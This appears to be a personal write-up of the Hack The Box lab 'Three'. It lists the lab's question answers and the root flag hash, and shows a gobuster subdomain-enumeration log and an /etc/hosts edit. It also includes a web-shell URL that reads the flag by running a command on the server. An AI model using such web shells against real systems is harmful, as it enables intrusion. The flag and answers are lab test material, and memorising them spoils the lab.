#### How many TCP ports are open?
2

#### What is the domain of the email address provided in the "Contact" section of the website?
thetoppers.htb

#### In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
/etc/hosts

#### Which sub-domain is discovered during further enumeration?
s3.thetoppers.htb

#### Which service is running on the discovered sub-domain?
amazon s3

#### Which command line utility can be used to interact with the service running on the discovered sub-domain?
awscli

#### Which command is used to set up the AWS CLI installation?
aws configure

#### What is the command used by the above utility to list all of the S3 buckets?
aws s3 ls

#### This server is configured to run files written in what web scripting language?
php

#### Submit root flag
a980d99281a28d638ac68b9bf9453c2b




In the browser we open the follow link: http://thetoppers.htb/shell.php?cmd=cat+../flag.txt


``` bash
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Three]
└──╼ $gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/06/01 02:45:11 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 404) [Size: 21]
Found: gc._msdcs.thetoppers.htb (Status: 400) [Size: 306]
                                                         
===============================================================
2023/06/01 02:45:56 Finished
===============================================================
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Three]
└──╼ $echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
[sudo] password for ramdark: 
10.129.227.248 s3.thetoppers.htb
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/HTB/StartPoint/Three]
└──╼ $


``` 
